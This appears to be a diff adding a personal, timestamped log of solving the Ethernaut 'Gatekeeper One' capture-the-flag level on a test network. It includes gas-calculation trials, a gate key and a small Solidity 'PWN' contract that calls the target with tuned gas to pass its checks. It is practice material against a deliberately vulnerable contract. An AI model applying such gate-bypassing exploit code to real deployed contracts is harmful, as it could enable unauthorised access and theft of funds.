@@ -466,3 +466,191 @@ gas input 78699395
 gas left  78699128
 
 ha... it worked in JS vm but does not work on Rinkeby.. wtf..
+
+let's try 9 less from 78699395
+
+78699382 x
+78699384 x
+78699386 x
+78699388 x
+78699389 x
+78699390 x
+78699395 x
+
+0xabababab0000946c
+
+okay. let's try 
+78699395 - 20000
+
+220408 00:44 KST
+Now I will try to do this with them... JS VM. deployed the whole contract, Now I will try to 
+tackle it there.
+
+0xabababab0000ddc4
+
+78699389 x
+
+
+220408 01:27 KST
+gas input 78699395
+gasleft1  78699164
+gasleft2  78696915
+
+
+it means.. require() took 2249 gas
+
+so what I need at gasleft2 is 78690937
+
+
+before require cost 231
+require costs 2249
+
+78690937 + 231 + 2249
+
+78693417
+
+let's try above
+
+
+
+220408 01:42 KST
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract PWN {
+  address public target = 0x45306D070231294BfF371dbBe6cDED94bE1f079B;
+  // address public target = 0x5e17b14ADd6c386305A32928F985b29bbA34Eff5;
+  function goTo(bytes8 _gateKey) external {
+      // (bool success , ) = target.call{gas: 78693417}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
+      (bool success , ) = target.call.gas(78691204)(abi.encodeWithSignature("enter(bytes8)", _gateKey));
+
+                                          //  80000000
+      require(success, "haha");
+  }
+}
+
+Let's try this
+
+dun work.
+
+220408 03:26 KST
+
+gas input  78691204
+gasYo1     78690973
+gasYo2     78668824
+
+gas input  78691204
+gasYo2     78690937
+
+
+now I try this
+78699395
+
+0xabababab0000946c
+
+maybe I need to think 
+push1 0 ...?...so 0 is pushed to the stack before gasleft() is called. I think.
+78691204 + 3
+78691207
+
+0408 03:50 KST
+still did not work, shit.
+
+220408 05:49 KST
+since gas limit gas limit	3000000
+lets try
+1228650+267 = 1228917
+
+220408 05:50 KST
+should I run this on ganache and write scripts that literally tries all different gas..
+this is too much. the level of this challenge is just 5, it should not be that hard.
+
+
+220408 06:07 KST
+
+when input  1500000
+Yo2         1499755
+
+245
+
+1499198 = 183*8191 + 245
+
+8191
+
+
+220409 03:55 KST
+
+14991203
+14990958
+
+245
+
+81910 + 245 = 82155
+
+
+oh.. when I did it in rinkeby, it gave different gas fee.
+
+input   82155
+gasleft 44511
+
+
+37644 + 8191 * 15
+160509
+
+..when I changed the gas, it still gave me 44511..
+
+
+220409 04:18
+This guy
+https://github.com/OpenZeppelin/ethernaut/issues/331
+talks about locally forking openzeppelin contract with ^0.6.0 solidity SafeMath. and checking
+all the gas cost through bytecodes one by one.
+I think that is crazy so I will just try to make sure that my safeMath version as
+exactly ^0.6.0;
+
+
+shit. maybe I should also call the function and debug
+
+0xabababab0000946c
+
+
+220409 04:49
+
+https://rinkeby.etherscan.io/address/0x45306D070231294BfF371dbBe6cDED94bE1f079B#code
+maybe I should just jot down how much is spent?
+
+
+shit...I natively thought I should just calculate all gas code till(including) GAS
+but there is a lot of jump, so I need to make a similar contract that I made before
+and run it...to count gas fees.
+
+
+220409 05:29
+Maybe the damn rinkeby version has issues.
+I will try to solve it all in JS VM
+
+I mean, when I checked the gasleft() it should be alright. hell is wrong with rinkeby
+
+
+220409 13:03
+in JS VM.
+I again, calculated that it takes 245 until my gasleft() hits.
+so I first did 245 + 8191 * 10 = 82155
+did not work.
+so I incremented by 3 it till it reaches 82164
+and it worked.
+maybe in the way I did it, did not fully represent the amount of gas being calculated
+in the original smart contract.
+
+Now I will try it on Rinkeby with 82164
+
+220409 13:08 KST
+SOLVED!
+
+Gatekeeper One
+Level completed!
+Difficulty 5/10
+
+Well done! Next, try your hand with the second gatekeeper...
+
